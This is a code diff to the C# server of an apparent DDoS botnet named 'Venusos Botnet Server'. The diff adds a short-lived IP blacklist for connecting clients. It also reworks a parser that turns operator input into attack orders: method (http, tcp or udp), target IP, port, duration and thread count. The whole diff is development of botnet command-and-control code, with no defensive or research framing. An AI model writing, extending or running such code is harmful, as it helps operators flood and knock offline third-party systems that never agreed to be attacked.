@@ -5,6 +5,7 @@ namespace Venusos_Botnet_Server
 {
     public class Tools
     {
+        public static List<IPAddress> blacklistedTcpClients = new List<IPAddress>();
         public static IPAddress GetLocalIP()
         {
             string localIP;
@@ -15,6 +16,20 @@ namespace Venusos_Botnet_Server
                 localIP = endPoint.Address.ToString();
             }
             return IPAddress.Parse(localIP);
+        }
+        public static void BlacklistTcpClient(TcpClient tcpClient)
+        {
+            IPAddress ip = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address;
+            blacklistedTcpClients.Add(ip);
+            Task.Run(() =>
+            {
+                Thread.Sleep(15000);
+                blacklistedTcpClients.Remove(ip);
+            });
+        }
+        public static bool IsBlacklisted(TcpClient tcpClient)
+        {
+            return blacklistedTcpClients.Contains(((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address);
         }
         public static string GetPassword()
         {
@@ -31,22 +46,22 @@ namespace Venusos_Botnet_Server
         public static Command CreateCommand(string data)
         {
             string[] options = data.Split(" ");
-            string error = "Errors:\n\r";
+            string error = null;
 
             if (options.Length < 6)
             {
-                throw new Exception("Not enough arguments\n\r");
+                throw new Exception("Not enough arguments\n");
             }
             else if (options.Length > 6)
             {
-                throw new Exception("Too many arguments\n\r");
+                throw new Exception("Too many arguments\n");
             }
 
             Command command = new Command();
 
             if (!new List<string> { "http", "tcp", "udp" }.Contains(options[1]))
             {
-                error += "unknown method\n\r";
+                error += "unknown method\n";
             }
             else
             {
@@ -59,7 +74,7 @@ namespace Venusos_Botnet_Server
             }
             catch
             {
-                error += "wrong ip address\n\r";
+                error += "wrong ip address\n";
             }
 
             try
@@ -68,16 +83,16 @@ namespace Venusos_Botnet_Server
             }
             catch
             {
-                error += "wrong port\n\r";
+                error += "wrong port\n";
             }
 
             try
             {
-                command.Duration = (Convert.ToInt32(options[4]) is >= 0) ? Convert.ToInt32(options[4]) : throw new Exception();
+                command.Duration = (Convert.ToInt32(options[4]) is > 0) ? Convert.ToInt32(options[4]) : throw new Exception();
             }
             catch
             {
-                error += "wrong duration\n\r";
+                error += "wrong duration\n";
             }
 
             try
@@ -86,10 +101,10 @@ namespace Venusos_Botnet_Server
             }
             catch
             {
-                error += "wrong threads ammount\n\r";
+                error += "wrong threads ammount\n";
             }
 
-            if (error == "Errors:\n\r")
+            if (error is null)
             {
                 return command;
             }
